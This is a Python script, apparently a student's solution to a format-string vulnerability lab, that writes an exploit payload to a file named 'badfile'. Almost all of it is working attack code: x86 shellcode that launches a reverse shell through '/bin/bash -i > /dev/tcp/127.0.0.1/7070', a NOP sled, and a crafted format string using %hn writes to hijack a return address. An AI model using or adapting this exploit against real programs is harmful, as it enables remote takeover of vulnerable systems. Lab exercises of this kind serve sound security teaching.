#!/usr/bin/python3
import sys

# This shellcode creates a local shell
local_shellcode= (
  "\x31\xc0\x31\xdb\xb0\xd5\xcd\x80"
  "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50"
  "\x53\x89\xe1\x99\xb0\x0b\xcd\x80\x00"
).encode('latin-1')

# Run "/bin/bash -c '/bin/rm /tmp/myfile'"
malicious_code= (
    # Push the command '/bin////bash' into stack (//// is equivalent to /)
    "\x31\xc0"                      # xorl %eax,%eax
    "\x50"                          # pushl %eax
    "\x68""bash"                    # pushl "bash"
    "\x68""////"                    # pushl "////"
    "\x68""/bin"                    # pushl "/bin"
    "\x89\xe3"                      # movl %esp, %ebx  

    # Push the 1st argument '-ccc' into stack (-ccc is equivalent to -c)
    "\x31\xc0"                      # xorl %eax,%eax
    "\x50"                          # pushl %eax
    "\x68""-ccc"                    # pushl "-ccc"
    "\x89\xe0"                      # movl %esp, %eax

    # Push the 2nd argument into the stack:
    #       '/bin/rm /tmp/myfile' 
    # '/bin/bash -i > /dev/tcp/127.0.0.1/7070 0<&1 2>&1'
    # Students need to use their own VM's IP address
    "\x31\xd2"                      # xorl %edx,%edx
    "\x52"                          # pushl %edx
    # "\x68""    "                    # pushl (an integer)
    # "\x68""ile "                    # pushl (an integer)
    # "\x68""/myf"                    # pushl (an integer)
    # "\x68""/tmp"                    # pushl (an integer)
    # "\x68""/rm "                    # pushl (an integer)
    # "\x68""/bin"                    # pushl (an integer)
    "\x68""    "                    # pushl (an integer)
    "\x68""2>&1"                    # pushl (an integer)
    "\x68""<&1 "                    # pushl (an integer)
    "\x68""70 0"                    # pushl (an integer)
    "\x68""1/70"                    # pushl (an integer)
    "\x68""0.0."                    # pushl (an integer)
    "\x68""127."                    # pushl (an integer)
    "\x68""tcp/"                    # pushl (an integer)
    "\x68""dev/"                    # pushl (an integer)
    "\x68"" > /"                    # pushl (an integer)
    "\x68""h -i"                    # pushl (an integer)
    "\x68""/bas"                    # pushl (an integer)
    "\x68""/bin"                    # pushl (an integer)
    "\x89\xe2"                      # movl %esp,%edx

    # Construct the argv[] array and set ecx
    "\x31\xc9"                      # xorl %ecx,%ecx
    "\x51"                          # pushl %ecx
    "\x52"                          # pushl %edx
    "\x50"                          # pushl %eax
    "\x53"                          # pushl %ebx
    "\x89\xe1"                      # movl %esp,%ecx  

    # Set edx to 0
    "\x31\xd2"                      #xorl %edx,%edx   

    # Invoke the system call
    "\x31\xc0"                      # xorl %eax,%eax
    "\xb0\x0b"                      # movb $0x0b,%al 
    "\xcd\x80"                      # int $0x80
).encode('latin-1')


N = 1200
# Fill the content with NOP's
content = bytearray(0x90 for i in range(N))

# Put the code at the end
start = N - len(malicious_code)
content[start:] = malicious_code


############################################################
#
#    Construct the format string here
# 
############################################################
n1 = 0xeef0
n2 = 0xbfff 
str1 = str(n1-8)
str2 = str((65536- n1 + n2)%65536)
format_string = ("\x9c\xed\xff\xbf\x9e\xed\xff\xbf%"+str1 +"x%128$hn%"+str2+"x%129$hn").encode('latin-1')
content = format_string + content
# Write the content to badfile
file = open("badfile", "wb")
file.write(content)
file.close()

